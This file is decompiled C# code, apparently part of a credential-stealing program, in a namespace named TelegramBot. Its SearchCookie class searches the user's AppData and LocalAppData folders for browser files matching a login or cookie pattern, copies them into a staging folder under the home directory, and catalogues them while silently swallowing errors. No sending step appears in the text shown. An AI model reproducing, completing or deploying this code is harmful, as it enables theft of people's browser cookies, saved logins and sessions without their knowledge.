using System;
using System.Collections.Generic;
using System.IO;
using System.Security;

namespace TelegramBot
{
	// Token: 0x020000E3 RID: 227
	public class SearchCookie
	{
		// Token: 0x1700001B RID: 27
		// (get) Token: 0x060002E5 RID: 741 RVA: 0x000030D6 File Offset: 0x000012D6
		private static int GetScount
		{
			get
			{
				return SearchCookie.Fragment++;
			}
		}

		// Token: 0x060002E6 RID: 742 RVA: 0x000218E0 File Offset: 0x0001FAE0
		public static void CheckList(string Logins)
		{
			List<string> list = new List<string>();
			foreach (string path in SearchCookie.BrPaths)
			{
				try
				{
					list.AddRange(Directory.EnumerateDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string path2 in list)
			{
				try
				{
					SearchCookie.Browsers.AddRange(Directory.EnumerateFiles(path2, Logins, SearchOption.AllDirectories));
				}
				catch
				{
				}
			}
		}

		// Token: 0x060002E7 RID: 743 RVA: 0x000219A8 File Offset: 0x0001FBA8
		private static void GetSecureFile(string PathLogins, string Pattern, SearchOption SO = SearchOption.TopDirectoryOnly)
		{
			try
			{
				foreach (string text in Directory.EnumerateFiles(PathLogins, Pattern, SO))
				{
					if (File.Exists(text))
					{
						SearchCookie.GetLogins.Add(text);
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (IOException)
			{
			}
			catch (SecurityException)
			{
			}
		}

		// Token: 0x060002E8 RID: 744 RVA: 0x00021A34 File Offset: 0x0001FC34
		public static void CopyLoginsInSafeDir(string Folder, bool Recursive = true)
		{
			try
			{
				Directory.CreateDirectory(Path.Combine(HomePath.User_Name, Folder));
			}
			catch
			{
			}
			for (int i = 0; i < SearchCookie.Browsers.Count; i++)
			{
				if (File.Exists(SearchCookie.Browsers[i]))
				{
					try
					{
						File.Copy(SearchCookie.Browsers[i], Path.Combine(Path.Combine(HomePath.User_Name, Folder), Path.GetFileName(string.Format("{0}{1}", SearchCookie.Browsers[i], SearchCookie.GetScount))), Recursive);
					}
					catch
					{
					}
				}
			}
			SearchCookie.GetSecureFile(Path.Combine(HomePath.User_Name, "Cookies"), "*", SearchOption.TopDirectoryOnly);
		}

		// Token: 0x04000518 RID: 1304
		private static int Fragment = 1;

		// Token: 0x04000519 RID: 1305
		private static List<string> Browsers = new List<string>();

		// Token: 0x0400051A RID: 1306
		public static List<string> GetLogins = new List<string>();

		// Token: 0x0400051B RID: 1307
		private static readonly List<string> BrPaths = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
		};
	}
}
